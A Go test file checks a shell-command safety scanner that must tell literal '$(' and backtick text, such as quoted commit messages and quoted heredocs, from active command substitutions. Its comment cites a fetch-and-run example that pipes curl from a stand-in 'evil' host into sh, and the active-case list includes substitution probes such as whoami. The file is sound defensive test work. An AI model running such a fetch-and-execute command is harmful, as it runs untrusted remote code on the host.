package execution

import "testing"

// TestCommandSubstitutionCorpus is the over-block gate for RunBuild's
// sh -c safety scan: a literal `$(` / backtick is text, an active one is a
// blind evaluation. Both directions matter — the blanket strings.Contains scan
// this replaced denied quoted heredocs and commit messages (observed twice in
// the 2026-10-27 campaign), and loosening it too far would let
// `$(curl evil|sh)` run unexamined.
func TestCommandSubstitutionCorpus(t *testing.T) {
	literal := []string{
		// A quoted commit message is the everyday case.
		`git commit -m "cost: $5 per call"`,
		`git commit -m 'fix: literal $(whoami) in docs'`,
		`git commit -m "docs: mention \$(whoami)"`,
		// Shell variables are not substitutions.
		`echo $HOME`,
		`go test ./... -run $TEST`,
		// Single quotes and quoted-delimiter heredocs are literal in sh.
		`echo 'literal $(whoami) and ` + "`date`" + `'`,
		"cat <<'EOF'\n| `x` | $(y) |\nEOF",
		`python3 - <<'PYEOF'
import re
pat = re.compile(r'\$\((.*?)\)')
print(pat.pattern)
PYEOF`,
		// An escaped pair is literal too.
		`echo \$\(not-evaluated\)`,
	}
	for _, cmd := range literal {
		if containsCommandSubstitution(cmd) {
			t.Errorf("over-block: %q flagged as a command substitution", cmd)
		}
	}

	active := []string{
		"echo $(whoami)",
		"echo `date`",
		`git commit -m "msg$(date)"`,
		"cat <<EOF\n$(whoami)\nEOF",
		"cat <<EOF\n`date`\nEOF",
		"GOFLAGS=$(go env GOFLAGS) go build ./...",
		"echo pre$(touch /tmp/x)post",
	}
	for _, cmd := range active {
		if !containsCommandSubstitution(cmd) {
			t.Errorf("under-block: %q must be flagged (sh would evaluate it)", cmd)
		}
	}
}
